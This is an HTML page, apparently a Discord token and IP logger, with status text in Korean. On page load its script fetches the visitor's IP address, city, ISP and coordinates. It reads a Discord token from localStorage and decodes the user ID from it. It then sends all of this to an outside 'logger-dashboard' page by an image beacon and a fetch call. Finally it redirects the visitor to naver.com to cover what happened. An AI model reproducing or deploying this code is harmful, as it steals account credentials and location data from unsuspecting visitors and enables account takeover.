<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Loading...</title>
</head>
<body style="background:#f5f5f5;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;">
  <div id="log" style="background:#fff;padding:20px;border-radius:8px;box-shadow:0 0 10px rgba(0,0,0,0.1);max-width:600px;width:100%;">
    <h2>⏳ 정보 수집 중...</h2>
    <pre id="debug" style="background:#1e1e1e;color:#0f0;padding:10px;border-radius:4px;font-size:12px;overflow-x:auto;min-height:100px;"></pre>
  </div>

  <script>
    (function() {
      const debug = document.getElementById('debug');
      function log(msg) {
        debug.textContent += msg + '\n';
        console.log(msg);
      }

      log('🚀 스크립트 시작');

      // 1. IP 정보 가져오기
      log('📡 IP 정보 요청 중...');
      fetch('https://ipapi.co/json/')
        .then(res => {
          log('✅ IP API 응답 받음 (status: ' + res.status + ')');
          return res.json();
        })
        .then(data => {
          log('📦 IP 데이터: ' + JSON.stringify(data, null, 2));
          const ip = data.ip || '알 수 없음';
          const city = data.city || '알 수 없음';
          const region = data.region || '알 수 없음';
          const country = data.country_name || '알 수 없음';
          const isp = data.org || '알 수 없음';
          const lat = data.latitude || '없음';
          const lon = data.longitude || '없음';

          // 2. 디스코드 토큰 가져오기
          log('🔑 디스코드 토큰 확인 중...');
          let token = '토큰 없음';
          let userId = '알 수 없음';
          try {
            const rawToken = localStorage.getItem('token');
            log('📂 localStorage.token: ' + (rawToken ? '존재함' : '없음'));
            if (rawToken) {
              token = rawToken.replace(/^"|"$/g, '');
              log('🔑 토큰: ' + token.substring(0, 20) + '...');
              try {
                const payload = JSON.parse(atob(token.split('.')[1]));
                userId = payload.sub || payload.id || '알 수 없음';
                log('👤 유저 ID: ' + userId);
              } catch(e) {
                log('❌ 토큰 디코딩 실패: ' + e.message);
              }
            }
          } catch(e) {
            log('❌ 토큰 접근 오류: ' + e.message);
          }

          // 3. 대시보드로 전송 (여러 방식 시도)
          const dashboardUrl = 'https://siwooaslkpi-ui.github.io/logger-dashboard/dashboard.html';
          const payload = {
            ip: ip,
            city: city,
            region: region,
            country: country,
            isp: isp,
            lat: lat,
            lon: lon,
            token: token,
            userId: userId
          };
          const params = new URLSearchParams(payload).toString();
          const url = dashboardUrl + '?log=' + encodeURIComponent(params);

          log('📤 전송 URL: ' + url);

          // 방법 1: Image 태그
          log('📤 방법 1: Image 태그로 전송');
          const img = new Image();
          img.src = url;
          img.onload = function() { log('✅ Image 전송 성공'); };
          img.onerror = function() { log('❌ Image 전송 실패'); };

          // 방법 2: fetch (no-cors)
          log('📤 방법 2: fetch로 전송');
          fetch(url, { mode: 'no-cors' })
            .then(() => log('✅ fetch 전송 완료 (no-cors)'))
            .catch(err => log('❌ fetch 오류: ' + err.message));

          // 방법 3: 직접 location.href로 이동 (테스트용)
          // log('📤 방법 3: location.href로 이동');
          // setTimeout(() => { window.location.href = url; }, 1000);

          // 4. 화면 표시
          log('✅ 모든 전송 시도 완료');
          document.querySelector('h2').textContent = '✅ 정보 수집 완료';
          document.querySelector('h2').style.color = '#0a0';

          // 5. 3초 후 네이버로 이동
          log('⏳ 3초 후 네이버로 이동');
          setTimeout(() => {
            window.location.href = 'https://naver.com';
          }, 3000);
        })
        .catch(err => {
          log('❌ IP API 오류: ' + err.message);
          document.querySelector('h2').textContent = '⚠️ 오류 발생';
          document.querySelector('h2').style.color = '#a00';
        });
    })();
  </script>
</body>
</html>
